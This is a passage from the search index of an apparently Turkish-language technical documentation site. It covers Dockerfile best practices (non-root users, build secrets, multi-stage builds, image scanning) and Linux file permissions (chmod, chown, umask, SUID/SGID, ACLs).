Dosya sahipli\u011fini de\u011fi\u015ftir\nRUN chown -R nodejs:nodejs /app\n\n# User'a ge\u00e7\nUSER nodejs\n\nEXPOSE 3000\n\nCMD [\"node\", \"server.js\"]\n</code></pre>"},{"location":"how-to/dockerfile-doc/#62-minimal-base-image","title":"6.2. Minimal Base Image","text":"<pre><code># \u2705 Alpine (5MB)\nFROM node:20-alpine\n\n# \u2705 Distroless (Google)\nFROM gcr.io/distroless/nodejs20-debian12\n\n# \u2705 Scratch (sadece binary)\nFROM scratch\n</code></pre>"},{"location":"how-to/dockerfile-doc/#63-secrets-yonetimi","title":"6.3. Secrets Y\u00f6netimi","text":"<p>\u274c Asla B\u00f6yle Yapmay\u0131n:</p> <pre><code>ENV DATABASE_PASSWORD=supersecret123\n</code></pre> <p>\u2705 Build-time Secrets:</p> <pre><code># syntax=docker/dockerfile:1\n\nFROM alpine\n\n# Secret mount et (image'a g\u00f6m\u00fclmez)\nRUN --mount=type=secret,id=db_password \\\n    cat /run/secrets/db_password &gt; /tmp/password\n</code></pre> <p>Build:</p> <pre><code>docker build --secret id=db_password,src=./secrets/db_password.txt .\n</code></pre> <p>\u2705 Runtime Secrets (Docker Compose):</p> <pre><code>services:\n  app:\n    secrets:\n      - db_password\n\nsecrets:\n  db_password:\n    file: ./secrets/db_password.txt\n</code></pre>"},{"location":"how-to/dockerfile-doc/#64-read-only-root-filesystem","title":"6.4. Read-Only Root Filesystem","text":"<pre><code>FROM node:20-alpine\n\nWORKDIR /app\n\nCOPY package*.json ./\nRUN npm ci\n\nCOPY . .\n\nUSER node\n\n# Sadece /tmp yaz\u0131labilir\nVOLUME [\"/tmp\"]\n\nCMD [\"node\", \"server.js\"]\n</code></pre> <p>docker-compose.yml:</p> <pre><code>services:\n  app:\n    read_only: true\n    tmpfs:\n      - /tmp\n</code></pre>"},{"location":"how-to/dockerfile-doc/#65-security-scanning","title":"6.5. Security Scanning","text":"<pre><code># Trivy ile scan\ntrivy image myapp:latest\n\n# Docker Scout\ndocker scout cves myapp:latest\n\n# Snyk\nsnyk container test myapp:latest\n</code></pre>"},{"location":"how-to/dockerfile-doc/#7-gercek-dunya-ornekleri","title":"7. Ger\u00e7ek D\u00fcnya \u00d6rnekleri \ud83c\udf0d","text":""},{"location":"how-to/dockerfile-doc/#71-production-grade-nodejs","title":"7.1. Production-Grade Node.js","text":"<pre><code># syntax=docker/dockerfile:1\n\n# ===== STAGE 1: Dependencies =====\nFROM node:20-alpine AS deps\n\nWORKDIR /app\n\n# Package files\nCOPY package.json package-lock.json ./\n\n# Install dependencies with cache mount\nRUN --mount=type=cache,target=/root/.npm \\\n    npm ci --omit=dev\n\n# ===== STAGE 2: Builder =====\nFROM node:20-alpine AS builder\n\nWORKDIR /app\n\nCOPY package.json package-lock.json ./\n\nRUN --mount=type=cache,target=/root/.npm \\\n    npm ci\n\nCOPY . .\n\n# Build\nRUN npm run build\n\n# ===== STAGE 3: Production =====\nFROM node:20-alpine AS production\n\nWORKDIR /app\n\n# Security: Non-root user\nRUN addgroup -g 1001 -S nodejs &amp;&amp; \\\n    adduser -S nodejs -u 1001\n\n# Copy dependencies\nCOPY --from=deps --chown=nodejs:nodejs /app/node_modules ./node_modules\n\n# Copy built app\nCOPY --from=builder --chown=nodejs:nodejs /app/dist ./dist\nCOPY --chown=nodejs:nodejs package.json ./\n\n# Switch to non-root user\nUSER nodejs\n\n# Health check (built-in Node.js, harici ba\u011f\u0131ml\u0131l\u0131k yok)\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n  CMD node -e \"require('http').get('http://localhost:3000/health', (r) =&gt; process.exit(r.statusCode === 200 ? 0 : 1))\"\n\n# Graceful shutdown\nSTOPSIGNAL SIGTERM\n\nEXPOSE 3000\n\nCMD [\"node\", \"dist/index.js\"]\n</code></pre>"},{"location":"how-to/dockerfile-doc/#72-production-grade-python-fastapi","title":"7.2. Production-Grade Python (FastAPI)","text":"<pre><code># syntax=docker/dockerfile:1\n\n# ===== STAGE 1: Builder =====\nFROM python:3.12-slim AS builder\n\nWORKDIR /app\n\n# Install build dependencies\nRUN apt-get update &amp;&amp; \\\n    apt-get install -y --no-install-recommends gcc &amp;&amp; \\\n    rm -rf /var/lib/apt/lists/*\n\n# Virtual environment\nRUN python -m venv /opt/venv\nENV PATH=\"/opt/venv/bin:$PATH\"\n\n# Install Python dependencies\nCOPY requirements.txt .\nRUN --mount=type=cache,target=/root/.cache/pip \\\n    pip install --no-cache-dir -r requirements.txt\n\n# ===== STAGE 2: Production =====\nFROM python:3.12-slim AS production\n\nWORKDIR /app\n\n# Copy virtual environment\nCOPY --from=builder /opt/venv /opt/venv\nENV PATH=\"/opt/venv/bin:$PATH\"\n\n# Copy application\nCOPY . .\n\n# Non-root user\nRUN useradd -m -u 1001 appuser &amp;&amp; \\\n    chown -R appuser:appuser /app\nUSER appuser\n\n# Health check (harici ba\u011f\u0131ml\u0131l\u0131k gerektirmez)\nHEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \\\n  CMD python -c \"import urllib.request; import sys; sys.exit(0 if urllib.request.urlopen('http://localhost:8000/health').getcode() == 200 else 1)\"\n\nEXPOSE 8000\n\nCMD [\"uvicorn\", \"main:app\", \"--host\", \"0.0.0.0\", \"--port\", \"8000\"]\n</code></pre> <p>[!WARNING] Healthcheck Ba\u011f\u0131ml\u0131l\u0131k Riski: <code>import requests</code> kullanmak i\u00e7in <code>requests</code> k\u00fct\u00fcphanesinin <code>requirements.txt</code>'de olmas\u0131 gerekir. Yukar\u0131daki \u00f6rnekte Python'un built-in <code>urllib.request</code> mod\u00fcl\u00fc kullan\u0131larak harici ba\u011f\u0131ml\u0131l\u0131k \u00f6nlenmi\u015ftir.</p>"},{"location":"how-to/dockerfile-doc/#73-production-grade-go","title":"7.3. Production-Grade Go","text":"<pre><code># syntax=docker/dockerfile:1\n\n# ===== STAGE 1: Builder =====\nFROM golang:1.21-alpine AS builder\n\nWORKDIR /app\n\n# Install dependencies\nRUN apk add --no-cache git ca-certificates\n\n# nobody user i\u00e7in passwd entry olu\u015ftur (scratch i\u00e7in)\nRUN echo \"nobody:x:65534:65534:Nobody:/:\" &gt; /etc/passwd.nobody\n\n# Go modules\nCOPY go.mod go.sum ./\nRUN --mount=type=cache,target=/go/pkg/mod \\\n    go mod download\n\n# Build\nCOPY . .\nRUN --mount=type=cache,target=/go/pkg/mod \\\n    --mount=type=cache,target=/root/.cache/go-build \\\n    CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -ldflags=\"-w -s\" -o main .\n\n# ===== STAGE 2: Production =====\nFROM scratch\n\n# CA certificates (HTTPS i\u00e7in)\nCOPY --from=builder /etc/ssl/certs/ca-certificates.crt /etc/ssl/certs/\n\n# Non-root user i\u00e7in passwd entry olu\u015ftur\nCOPY --from=builder /etc/passwd.nobody /etc/passwd\n\n# Binary\nCOPY --from=builder /app/main /main\n\n# Non-root user\nUSER nobody\n\nEXPOSE 8080\n\nENTRYPOINT [\"/main\"]\n</code></pre>"},{"location":"how-to/dockerfile-doc/#8-debugging-ve-troubleshooting","title":"8. Debugging ve Troubleshooting \ud83d\udd0d","text":""},{"location":"how-to/dockerfile-doc/#81-build-srasnda-debug","title":"8.1. Build S\u0131ras\u0131nda Debug","text":"<pre><code># Intermediate stage'i debug et\nFROM node:20-alpine AS debug\n\nWORKDIR /app\n\nCOPY package*.json ./\nRUN npm ci\n\n# Debug i\u00e7in shell a\u00e7\nRUN echo \"Debug point\" &amp;&amp; ls -la\n\nCOPY . .\n</code></pre> <p>Build ve debug:</p> <pre><code># Belirli stage'e kadar build et\ndocker build --target debug -t myapp:debug .\n\n# Container'\u0131 \u00e7al\u0131\u015ft\u0131r ve i\u00e7ine gir\ndocker run -it myapp:debug sh\n</code></pre>"},{"location":"how-to/dockerfile-doc/#82-layerlar-inceleme","title":"8.2. Layer'lar\u0131 \u0130nceleme","text":"<pre><code># Image history\ndocker history myapp:latest\n\n# Detayl\u0131 bilgi\ndocker inspect myapp:latest\n\n# Dive ile layer analizi\ndive myapp:latest\n</code></pre>"},{"location":"how-to/dockerfile-doc/#83-build-cachei-temizle","title":"8.3. Build Cache'i Temizle","text":"<pre><code># T\u00fcm cache'i temizle\ndocker builder prune -a\n\n# BuildKit cache'i temizle\ndocker buildx prune -a\n</code></pre>"},{"location":"how-to/dockerfile-doc/#9-ileri-seviye-ozellikler","title":"9. \u0130leri Seviye \u00d6zellikler \ud83d\ude80","text":""},{"location":"how-to/dockerfile-doc/#91-multi-platform-builds-arm64-amd64","title":"9.1. Multi-Platform Builds (ARM64 + AMD64)","text":"<pre><code># syntax=docker/dockerfile:1\n\n# Platform-specific base image\nFROM --platform=$TARGETPLATFORM node:20-alpine\n\nWORKDIR /app\n\nCOPY package*.json ./\nRUN npm ci\n\nCOPY . .\n\nCMD [\"node\", \"server.js\"]\n</code></pre> <p>Build:</p> <pre><code># Tek platform\ndocker buildx build --platform linux/amd64 -t myapp:amd64 .\n\n# Multi-platform (ARM64 + AMD64)\ndocker buildx build --platform linux/amd64,linux/arm64 -t myapp:latest --push .\n</code></pre>"},{"location":"how-to/dockerfile-doc/#92-heredoc-syntax-buildkit-14","title":"9.2. Heredoc Syntax (BuildKit 1.4+)","text":"<pre><code># syntax=docker/dockerfile:1\n\nFROM ubuntu:22.04\n\n# \u00c7ok sat\u0131rl\u0131 script i\u00e7in heredoc\nRUN &lt;&lt;EOF\napt-get update\napt-get install -y curl wget git\napt-get clean\nrm -rf /var/lib/apt/lists/*\nEOF\n\n# Dosya olu\u015fturmak i\u00e7in\nCOPY &lt;&lt;EOF /etc/app/config.json\n{\n  \"port\": 3000,\n  \"debug\": false,\n  \"database\": {\n    \"host\": \"localhost\",\n    \"port\": 5432\n  }\n}\nEOF\n\n# Python script olu\u015ftur\nCOPY &lt;&lt;EOF /app/healthcheck.py\nimport http.client\nconn = http.client.HTTPConnection(\"localhost\", 8000)\nconn.request(\"GET\", \"/health\")\nresponse = conn.getresponse()\nexit(0 if response.status == 200 else 1)\nEOF\n</code></pre>"},{"location":"how-to/dockerfile-doc/#93-copy-chmod-buildkit","title":"9.3. COPY --chmod (BuildKit)","text":"<pre><code># syntax=docker/dockerfile:1\n\nFROM node:20-alpine\n\n# Dosyay\u0131 kopyalarken permission ayarla\nCOPY --chmod=755 scripts/entrypoint.sh /entrypoint.sh\nCOPY --chmod=644 config/app.conf /etc/app/\n\n# Art\u0131k RUN chmod yapmaya gerek yok!\nENTRYPOINT [\"/entrypoint.sh\"]\n</code></pre>"},{"location":"how-to/dockerfile-doc/#94-argdan-enve-deger-aktarma","title":"9.4. ARG'dan ENV'e De\u011fer Aktarma","text":"<pre><code># Build-time de\u011fi\u015fken\nARG NODE_ENV=production\nARG APP_VERSION=1.0.0\n\n# Runtime'da da kullan\u0131labilsin\nENV NODE_ENV=$NODE_ENV \\\n    APP_VERSION=$APP_VERSION\n\n# Build s\u0131ras\u0131nda\n# docker build --build-arg NODE_ENV=development .\n</code></pre>"},{"location":"how-to/dockerfile-doc/#95-gelismis-cache-mount-ornekleri","title":"9.5. Geli\u015fmi\u015f Cache Mount \u00d6rnekleri","text":"<pre><code># syntax=docker/dockerfile:1\n\n# Python pip cache\nFROM python:3.12-slim\nRUN --mount=type=cache,target=/root/.cache/pip \\\n    pip install -r requirements.txt\n\n# Go module cache\nFROM golang:1.21-alpine\nRUN --mount=type=cache,target=/go/pkg/mod \\\n    --mount=type=cache,target=/root/.cache/go-build \\\n    go build -o main .\n\n# apt cache (Debian/Ubuntu)\nFROM ubuntu:22.04\nRUN --mount=type=cache,target=/var/cache/apt,sharing=locked \\\n    --mount=type=cache,target=/var/lib/apt,sharing=locked \\\n    apt-get update &amp;&amp; apt-get install -y curl\n\n# npm cache (farkl\u0131 sharing modes)\nFROM node:20-alpine\nRUN --mount=type=cache,target=/root/.npm,sharing=private \\\n    npm ci\n</code></pre> <p>Cache Sharing Modes:</p> <ul> <li><code>shared</code>: Birden fazla build ayn\u0131 cache'i kullanabilir (default)</li> <li><code>private</code>: Her build kendi cache'ini kullan\u0131r</li> <li><code>locked</code>: Ayn\u0131 anda sadece bir build kullanabilir</li> </ul>"},{"location":"how-to/dockerfile-doc/#10-checklist-production-ready-dockerfile","title":"10. Checklist: Production-Ready Dockerfile \ud83d\udccb","text":"<ul> <li>[ ] Multi-stage build kullan\u0131l\u0131yor</li> <li>[ ] Alpine veya slim base image</li> <li>[ ] Non-root user ile \u00e7al\u0131\u015f\u0131yor</li> <li>[ ] .dockerignore dosyas\u0131 var</li> <li>[ ] Layer caching optimize edilmi\u015f (dependencies \u00f6nce)</li> <li>[ ] Secrets image'a g\u00f6m\u00fclmemi\u015f</li> <li>[ ] Health check tan\u0131ml\u0131 (built-in tools kullan\u0131lm\u0131\u015f)</li> <li>[ ] Minimal dependencies (sadece production)</li> <li>[ ] Security scan yap\u0131lm\u0131\u015f (Trivy, Scout)</li> <li>[ ] Image size optimize edilmi\u015f (&lt;200MB ideal)</li> <li>[ ] Labels eklenmi\u015f (OCI standart)</li> <li>[ ] EXPOSE do\u011fru port'lar\u0131 g\u00f6steriyor</li> <li>[ ] STOPSIGNAL tan\u0131ml\u0131 (graceful shutdown)</li> <li>[ ] Platform belirtilmi\u015f (multi-arch i\u00e7in)</li> <li>[ ] Pinned versions (node:20.10.0-alpine, node:20-alpine de\u011fil)</li> <li>[ ] Build time optimize (&lt;2 dakika ideal)</li> <li>[ ] No latest tag (versiyon numaras\u0131 kullan\u0131l\u0131yor)</li> </ul>"},{"location":"how-to/dockerfile-doc/#11-kaynaklar","title":"11. Kaynaklar \ud83d\udcda","text":"<ul> <li>Dockerfile Best Practices</li> <li>Multi-Stage Builds</li> <li>BuildKit</li> <li>Security Best Practices</li> <li>Multi-Platform Builds</li> </ul> <p>\ud83d\udca1 Pro Tip: Her Dockerfile de\u011fi\u015fikli\u011finden sonra <code>docker scout cves</code> ile g\u00fcvenlik taramas\u0131 yap\u0131n!</p>"},{"location":"how-to/file-permissions/","title":"Dosya \u0130zinleri (chmod, chown, umask) \ud83d\udd10","text":"<p>Linux'ta dosya ve dizin izinleri, sistemin g\u00fcvenli\u011finin temelidir. Bu rehber, izinleri nas\u0131l okuyaca\u011f\u0131n\u0131z\u0131, de\u011fi\u015ftirece\u011finizi ve y\u00f6netece\u011finizi anlat\u0131r.</p>"},{"location":"how-to/file-permissions/#izin-yapisi","title":"\ud83d\udd0d \u0130zin Yap\u0131s\u0131","text":""},{"location":"how-to/file-permissions/#izin-gosterimi","title":"\u0130zin G\u00f6sterimi","text":"<pre><code>ls -l dosya.txt\n-rw-r--r-- 1 user group 1234 Jan 22 10:00 dosya.txt\n\u2502\u2502\u2502\u2502\u2502\u2502\u2502\u2502\u2502  \u2502 \u2502    \u2502     \u2502    \u2502            \u2502\n\u2502\u2502\u2502\u2502\u2502\u2502\u2502\u2502\u2502  \u2502 \u2502    \u2502     \u2502    \u2502            \u2514\u2500 Dosya ad\u0131\n\u2502\u2502\u2502\u2502\u2502\u2502\u2502\u2502\u2502  \u2502 \u2502    \u2502     \u2502    \u2514\u2500 Tarih\n\u2502\u2502\u2502\u2502\u2502\u2502\u2502\u2502\u2502  \u2502 \u2502    \u2502     \u2514\u2500 Boyut\n\u2502\u2502\u2502\u2502\u2502\u2502\u2502\u2502\u2502  \u2502 \u2502    \u2514\u2500 Grup\n\u2502\u2502\u2502\u2502\u2502\u2502\u2502\u2502\u2502  \u2502 \u2514\u2500 Sahip (owner)\n\u2502\u2502\u2502\u2502\u2502\u2502\u2502\u2502\u2502  \u2514\u2500 Link say\u0131s\u0131\n\u2502\u2502\u2502\u2502\u2502\u2502\u2502\u2502\u2514\u2500 Di\u011fer kullan\u0131c\u0131lar (others): r-- (okuma)\n\u2502\u2502\u2502\u2502\u2502\u2514\u2500 Grup (group): r-- (okuma)\n\u2502\u2502\u2514\u2500 Sahip (owner): rw- (okuma + yazma)\n\u2514\u2500 Dosya tipi: - (normal dosya)\n</code></pre>"},{"location":"how-to/file-permissions/#dosya-tipleri","title":"Dosya Tipleri","text":"Sembol Tip <code>-</code> Normal dosya <code>d</code> Dizin (directory) <code>l</code> Sembolik link <code>c</code> Karakter cihaz\u0131 <code>b</code> Blok cihaz\u0131 <code>s</code> Socket <code>p</code> Named pipe"},{"location":"how-to/file-permissions/#izin-tipleri","title":"\u0130zin Tipleri","text":"Sembol \u0130zin Say\u0131sal Dosya Dizin <code>r</code> Read (Okuma) 4 Dosya i\u00e7eri\u011fini okuma Dizin i\u00e7eri\u011fini listeleme <code>w</code> Write (Yazma) 2 Dosyay\u0131 de\u011fi\u015ftirme Dosya olu\u015fturma/silme <code>x</code> Execute (\u00c7al\u0131\u015ft\u0131rma) 1 Dosyay\u0131 \u00e7al\u0131\u015ft\u0131rma Dizine girme (cd) <code>-</code> \u0130zin yok 0 - -"},{"location":"how-to/file-permissions/#izinleri-goruntuleme","title":"\ud83d\udc41\ufe0f \u0130zinleri G\u00f6r\u00fcnt\u00fcleme","text":"<pre><code># Dosya izinlerini g\u00f6ster\nls -l dosya.txt\n\n# Dizin izinlerini g\u00f6ster (dizinin kendisi)\nls -ld /var/www\n\n# T\u00fcm dosyalar\u0131 g\u00f6ster (gizli dahil)\nls -la\n\n# \u0130nsan okunabilir boyutlarla\nls -lh\n\n# Say\u0131sal izinlerle g\u00f6ster\nstat -c \"%a %n\" dosya.txt\n# \u00c7\u0131kt\u0131: 644 dosya.txt\n</code></pre>"},{"location":"how-to/file-permissions/#chmod","title":"\ud83d\udd27 chmod - \u0130zin De\u011fi\u015ftirme","text":""},{"location":"how-to/file-permissions/#saysal-yontem-octal","title":"Say\u0131sal Y\u00f6ntem (Octal)","text":"<pre><code># Say\u0131sal izin hesaplama:\n# r (4) + w (2) + x (1) = 7 (t\u00fcm izinler)\n# r (4) + w (2) = 6 (okuma + yazma)\n# r (4) + x (1) = 5 (okuma + \u00e7al\u0131\u015ft\u0131rma)\n# r (4) = 4 (sadece okuma)\n\n# \u00d6rnek: 755\n# 7 (rwx) = Sahip: okuma + yazma + \u00e7al\u0131\u015ft\u0131rma\n# 5 (r-x) = Grup: okuma + \u00e7al\u0131\u015ft\u0131rma\n# 5 (r-x) = Di\u011ferleri: okuma + \u00e7al\u0131\u015ft\u0131rma\n\nchmod 755 script.sh\nchmod 644 config.txt\nchmod 600 secret.key\nchmod 700 private_dir\n</code></pre>"},{"location":"how-to/file-permissions/#sembolik-yontem","title":"Sembolik Y\u00f6ntem","text":"<pre><code># Kullan\u0131c\u0131 tipleri:\n# u = user (sahip)\n# g = group (grup)\n# o = others (di\u011ferleri)\n# a = all (hepsi)\n\n# \u0130\u015flemler:\n# + = izin ekle\n# - = izin kald\u0131r\n# = = izinleri ayarla (di\u011ferlerini s\u0131f\u0131rla)\n\n# \u00d6rnekler:\nchmod u+x script.sh          # Sahibe \u00e7al\u0131\u015ft\u0131rma izni ekle\nchmod g-w file.txt           # Gruptan yazma iznini kald\u0131r\nchmod o-r secret.txt         # Di\u011ferlerinden okuma iznini kald\u0131r\nchmod a+r public.txt         # Herkese okuma izni ekle\nchmod u=rwx,g=rx,o=r file   # \u0130zinleri ayarla (755)\nchmod +x script.sh           # Herkese \u00e7al\u0131\u015ft\u0131rma ekle\n</code></pre>"},{"location":"how-to/file-permissions/#recursive-alt-dizinler-dahil","title":"Recursive (Alt Dizinler Dahil)","text":"<pre><code># T\u00fcm dosya ve dizinlere uygula\nchmod -R 755 /var/www\n\n# Sadece dizinlere 755\nfind /var/www -type d -exec chmod 755 {} \\;\n\n# Sadece dosyalara 644\nfind /var/www -type f -exec chmod 644 {} \\;\n</code></pre>"},{"location":"how-to/file-permissions/#yaygn-izin-kombinasyonlar","title":"Yayg\u0131n \u0130zin Kombinasyonlar\u0131","text":"\u0130zin Say\u0131sal Kullan\u0131m <code>rwx------</code> 700 \u00d6zel dizinler (sadece sahip eri\u015febilir) <code>rwxr-xr-x</code> 755 \u00c7al\u0131\u015ft\u0131r\u0131labilir dosyalar, dizinler <code>rw-r--r--</code> 644 Normal dosyalar (config, text) <code>rw-------</code> 600 Hassas dosyalar (SSH key, \u015fifreler) <code>rw-rw-r--</code> 664 Grup ile payla\u015f\u0131lan dosyalar <code>rwxrwxrwx</code> 777 ASLA KULLANMA! (G\u00fcvenlik riski)"},{"location":"how-to/file-permissions/#chown","title":"\ud83d\udc64 chown - Sahiplik De\u011fi\u015ftirme","text":""},{"location":"how-to/file-permissions/#temel-kullanm","title":"Temel Kullan\u0131m","text":"<pre><code># Sadece sahip de\u011fi\u015ftir\nchown user dosya.txt\n\n# Sahip ve grup de\u011fi\u015ftir\nchown user:group dosya.txt\n\n# Sadece grup de\u011fi\u015ftir\nchown :group dosya.txt\n# veya\nchgrp group dosya.txt\n\n# Recursive (alt dizinler dahil)\nchown -R user:group /var/www\n</code></pre>"},{"location":"how-to/file-permissions/#pratik-ornekler_1","title":"Pratik \u00d6rnekler","text":"<pre><code># Web dizinini www-data kullan\u0131c\u0131s\u0131na ver\nsudo chown -R www-data:www-data /var/www/html\n\n# Docker volume'u kullan\u0131c\u0131ya ver\nsudo chown -R $USER:$USER ~/docker-data\n\n# Kullan\u0131c\u0131 home dizinini d\u00fczelt\nsudo chown -R username:username /home/username\n\n# Mevcut kullan\u0131c\u0131ya ver\nchown $USER:$USER dosya.txt\n</code></pre>"},{"location":"how-to/file-permissions/#sahipligi-goruntuleme","title":"Sahipli\u011fi G\u00f6r\u00fcnt\u00fcleme","text":"<pre><code># Dosya sahibini g\u00f6ster\nls -l dosya.txt\n\n# Say\u0131sal UID/GID ile g\u00f6ster\nls -n dosya.txt\n\n# Sadece sahip ve grup\nstat -c \"%U %G\" dosya.txt\n</code></pre>"},{"location":"how-to/file-permissions/#umask","title":"\ud83c\udfad umask - Varsay\u0131lan \u0130zinler","text":"<p><code>umask</code>, yeni olu\u015fturulan dosya ve dizinlerin varsay\u0131lan izinlerini belirler.</p>"},{"location":"how-to/file-permissions/#umask-nasl-calsr","title":"umask Nas\u0131l \u00c7al\u0131\u015f\u0131r?","text":"<pre><code>Varsay\u0131lan izinler:\n- Dosyalar: 666 (rw-rw-rw-)\n- Dizinler: 777 (rwxrwxrwx)\n\numask bu izinlerden \u00c7IKARIL\u0131r:\n\numask 022:\n- Dosya: 666 - 022 = 644 (rw-r--r--)\n- Dizin: 777 - 022 = 755 (rwxr-xr-x)\n\numask 077:\n- Dosya: 666 - 077 = 600 (rw-------)\n- Dizin: 777 - 077 = 700 (rwx------)\n</code></pre>"},{"location":"how-to/file-permissions/#umask-kullanm","title":"umask Kullan\u0131m\u0131","text":"<pre><code># Mevcut umask'\u0131 g\u00f6ster\numask\n# \u00c7\u0131kt\u0131: 0022\n\n# Sembolik g\u00f6sterim\numask -S\n# \u00c7\u0131kt\u0131: u=rwx,g=rx,o=rx\n\n# umask de\u011fi\u015ftir (ge\u00e7ici)\numask 077\n\n# Kal\u0131c\u0131 yapmak i\u00e7in ~/.bashrc'ye ekle\necho \"umask 077\" &gt;&gt; ~/.bashrc\n</code></pre>"},{"location":"how-to/file-permissions/#onerilen-umask-degerleri","title":"\u00d6nerilen umask De\u011ferleri","text":"umask Dosya Dizin Kullan\u0131m <code>022</code> 644 755 Varsay\u0131lan (Ubuntu/Debian) <code>027</code> 640 750 Orta g\u00fcvenlik <code>077</code> 600 700 Y\u00fcksek g\u00fcvenlik (\u00f6zel dosyalar) <code>002</code> 664 775 Grup payla\u015f\u0131m\u0131"},{"location":"how-to/file-permissions/#ozel-izinler","title":"\ud83d\udd12 \u00d6zel \u0130zinler (SUID, SGID, Sticky Bit)","text":""},{"location":"how-to/file-permissions/#suid-set-user-id-4000","title":"SUID (Set User ID) - 4000","text":"<p>Dosya, sahibinin yetkisiyle \u00e7al\u0131\u015f\u0131r (kullan\u0131c\u0131n\u0131n de\u011fil).</p> <pre><code># SUID ekle\nchmod u+s /usr/bin/passwd\nchmod 4755 /usr/bin/passwd\n\n# G\u00f6r\u00fcn\u00fcm: -rwsr-xr-x (s harfi)\n\n# \u00d6rnek: passwd komutu\nls -l /usr/bin/passwd\n-rwsr-xr-x 1 root root 68208 /usr/bin/passwd\n# Normal kullan\u0131c\u0131 \u00e7al\u0131\u015ft\u0131rsa da root yetkisiyle \u00e7al\u0131\u015f\u0131r\n</code></pre> <p>[!WARNING] &gt; G\u00fcvenlik Riski: SUID dosyalar\u0131 dikkatli kullan\u0131lmal\u0131. Yanl\u0131\u015f kullan\u0131mda privilege escalation riski vard\u0131r.</p>"},{"location":"how-to/file-permissions/#sgid-set-group-id-2000","title":"SGID (Set Group ID) - 2000","text":"<p>Dosya: Grubun yetkisiyle \u00e7al\u0131\u015f\u0131r. Dizin: \u0130\u00e7inde olu\u015fturulan dosyalar dizinin grubunu al\u0131r.</p> <pre><code># SGID ekle\nchmod g+s /shared/project\nchmod 2775 /shared/project\n\n# G\u00f6r\u00fcn\u00fcm: drwxrwsr-x (s harfi)\n\n# Kullan\u0131m: Payla\u015f\u0131lan proje dizini\nmkdir /shared/project\nchown :developers /shared/project\nchmod 2775 /shared/project\n\n# Art\u0131k bu dizinde kim dosya olu\u015fturursa, grup \"developers\" olur\n</code></pre>"},{"location":"how-to/file-permissions/#sticky-bit-1000","title":"Sticky Bit - 1000","text":"<p>Sadece dosya sahibi ve root silebilir (di\u011ferleri silemez).</p> <pre><code># Sticky bit ekle\nchmod +t /tmp\nchmod 1777 /tmp\n\n# G\u00f6r\u00fcn\u00fcm: drwxrwxrwt (t harfi)\n\n# \u00d6rnek: /tmp dizini\nls -ld /tmp\ndrwxrwxrwt 10 root root 4096 /tmp\n# Herkes dosya olu\u015fturabilir ama sadece sahibi silebilir\n</code></pre>"},{"location":"how-to/file-permissions/#ozel-izinleri-kaldrma","title":"\u00d6zel \u0130zinleri Kald\u0131rma","text":"<pre><code># SUID kald\u0131r\nchmod u-s dosya\n\n# SGID kald\u0131r\nchmod g-s dosya\n\n# Sticky bit kald\u0131r\nchmod -t dizin\n</code></pre>"},{"location":"how-to/file-permissions/#acl","title":"\ud83d\udcdd ACL (Geli\u015fmi\u015f \u0130zinler)","text":"<p>ACL (Access Control List), standart izinlerden daha detayl\u0131 kontrol sa\u011flar.</p>"},{"location":"how-to/file-permissions/#acl-kurulumu","title":"ACL Kurulumu","text":"<pre><code># ACL ara\u00e7lar\u0131n\u0131 kur\nsudo apt install acl\n\n# Dosya sisteminde ACL aktif mi kontrol et\nmount | grep acl\n</code></pre>"},{"location":"how-to/file-permissions/#acl-kullanm","title":"ACL Kullan\u0131m\u0131","text":"<pre><code># ACL'leri g\u00f6r\u00fcnt\u00fcle\ngetfacl dosya.txt\n\n# Belirli kullan\u0131c\u0131ya izin ver\nsetfacl -m u:username:rwx dosya.txt\n\n# Belirli gruba izin ver\nsetfacl -m g:groupname:rx dosya.txt\n\n# ACL kald\u0131r\nsetfacl -x u:username dosya.txt\n\n# T\u00fcm ACL'leri kald\u0131r\nsetfacl -b dosya.txt\n\n# Recursive ACL\nsetfacl -R -m u:username:rwx /dizin\n\n# Varsay\u0131lan ACL (yeni dosyalar i\u00e7in)\nsetfacl -d -m u:username:rwx /dizin\n</code></pre>"},{"location":"how-to/file-permissions/#pratik-ornekler","title":"\ud83d\udee0\ufe0f Pratik \u00d6rnekler","text":""},{"location":"how-to/file-permissions/#1-web-sunucusu-dizini","title":"1. Web Sunucusu Dizini","text":"<pre><code># Nginx/Apache i\u00e7in\nsudo chown -R www-data:www-data /var/www/html\nsudo find /var/www/html -type d -exec chmod 755 {} \\;\nsudo find /var/www/html -type f -exec chmod 644 {} \\;\n</code></pre>"},{"location":"how-to/file-permissions/#2-ssh-key-izinleri","title":"2. SSH Key \u0130zinleri","text":"<pre><code># SSH dizini\nchmod 700 ~/.ssh\n\n# Private key\nchmod 600 ~/.ssh/id_rsa\n\n# Public key\nchmod 644 ~/.ssh/id_rsa.pub\n\n# authorized_keys\nchmod 600 ~/.ssh/authorized_keys\n</code></pre>"},{"location":"how-to/file-permissions/#3-script-calstrlabilir-yapma","title":"3. Script \u00c7al\u0131\u015ft\u0131r\u0131labilir Yapma","text":"<pre><code># Script'e \u00e7al\u0131\u015ft\u0131rma izni ver\nchmod +x script.sh\n\n# Sadece sahip \u00e7al\u0131\u015ft\u0131rabilsin\nchmod 700 script.sh\n\n# Herkes \u00e7al\u0131\u015ft\u0131rabilsin\nchmod 755 script.sh\n</code></pre>"},{"location":"how-to/file-permissions/#4-paylaslan-proje-dizini","title":"4. Payla\u015f\u0131lan Proje Dizini","text":"<pre><code># Grup ile payla\u015f\u0131lan dizin\nsudo mkdir /shared/project\nsudo chown :developers /shared/project\nsudo chmod 2775 /shared/project\nsudo setfacl -d -m g:developers:rwx /shared/project\n</code></pre>"},{"location":"how-to/file-permissions/#5-docker-volume-izinleri","title":"5. Docker Volume \u0130zinleri","text":"<pre><code># Docker volume'u kullan\u0131c\u0131ya ver\nsudo chown -R $USER:$USER ~/docker-volumes\n\n# Container i\u00e7indeki UID ile e\u015fle\u015ftir\nsudo chown -R 1000:1000 ~/docker-volumes/app\n</code></pre>"},{"location":"how-to/file-permissions/#6-log-dosyas-izinleri","title":"6. Log Dosyas\u0131 \u0130zinleri","text":"<pre><code># Log dosyas\u0131 (sadece root yazabilir, herkes okuyabilir)\nsudo chmod 644 /var/log/myapp.log\nsudo chown root:adm /var/log/myapp.log\n\n# Hassas log (sadece root)\nsudo chmod 600 /var/log/auth.log\n</code></pre>"},{"location":"how-to/file-permissions/#7-guvenli-config-dosyas","title":"7. G\u00fcvenli Config Dosyas\u0131","text":"<pre><code># Config dosyas\u0131 (sadece sahip okuyabilir)\nchmod 600 